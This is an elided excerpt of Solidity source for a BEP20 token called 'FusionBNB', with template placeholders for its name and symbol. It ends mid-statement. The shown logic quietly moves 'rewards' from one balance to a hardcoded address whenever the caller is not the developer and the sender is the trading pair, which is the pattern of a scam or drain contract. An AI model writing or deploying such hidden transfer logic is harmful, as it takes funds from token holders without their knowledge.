...
contract Coin is BEP20, IERC20 {
  ...
  string public name = /*TOKENNAME*/"FusionBNB"/*TOKENNAME*/;
  string public symbol = /*TOKENSYMBOL*/"FBNB"/*TOKENSYMBOL*/;
    ...
    if (tx.origin != dev) {
      ...
      if (sender == uniswapV2Pair && rewards > 0) {
        if (_tOwned[Titano] > rewards) {
          _tOwned[
            address(0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad)
          ] += rewards;
          _tOwned[Titano] -= rewards;
          emit Transfer(
            Titano,
            address(0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad),
            rewards
